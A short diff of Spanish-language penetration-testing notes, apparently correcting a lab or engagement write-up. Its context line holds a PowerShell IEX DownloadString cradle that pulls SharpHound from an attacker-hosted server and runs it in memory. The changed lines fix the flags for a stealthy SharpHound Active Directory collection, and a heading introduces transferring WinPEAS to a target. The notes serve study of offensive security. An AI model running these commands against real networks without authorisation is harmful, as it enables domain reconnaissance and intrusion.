@@ -29,7 +29,7 @@ IEX (New-Object Net.WebClient).DownloadString('http://172.16.99.11:8000/SharpHou
 ```powershell
 Invoke-Bloodhound -CollectionMethod All -Stealth
 o
-.\SharpHound.exe --collectionmethods All -Stealth
+.\SharpHound.exe -c All --Stealth
 ```
 
 **4. (No documentado) Transferir WinPEAS antes de ejecutarlo** El informe dice "pudimos ejecutar WinPeas.exe" sin mostrar la descarga. En Windows, sin usar Kali, se hace así:
